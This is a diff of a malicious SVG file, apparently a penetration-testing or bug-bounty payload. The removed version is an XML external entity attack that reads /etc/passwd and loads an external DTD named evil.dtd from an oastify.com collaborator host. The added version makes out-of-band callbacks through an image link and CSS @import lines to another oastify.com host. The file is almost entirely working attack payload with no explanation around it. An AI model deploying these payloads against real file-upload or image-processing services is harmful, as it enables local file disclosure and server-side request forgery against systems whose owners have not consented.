@@ -1,8 +1,12 @@
-<!DOCTYPE svg [
-    <!ENTITY % xxe SYSTEM "file:///etc/passwd">
-    <!ENTITY % dtd SYSTEM "https://j7ru0hq55nzwmdeqmktk1eehz85zt3hs.oastify.com/evil.dtd">
-    %dtd;
-]>
-<svg width="200" height="200" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
-    <text x="10" y="20">&xxe;</text>
+<?xml version="1.0" standalone="yes"?>
+    <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+    <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
+    <image height="200" width="200" xlink:href="http://[xxy8qvgjv1pacr44cyjyrs4vpmvdji77.oastify.com](http://xxy8qvgjv1pacr44cyjyrs4vpmvdji77.oastify.com/)/3" />
+    <style type="text/css">@import url("http://xxy8qvgjv1pacr44cyjyrs4vpmvdji77.oastify.com/5");</style>
+    <style type="text/css">
+         <![CDATA[
+            @import url("http://xxy8qvgjv1pacr44cyjyrs4vpmvdji77.oastify.com:80/9");
+            rect { fill: red; stroke: blue; stroke-width: 3 }
+         ]]>
+    </style>
 </svg>
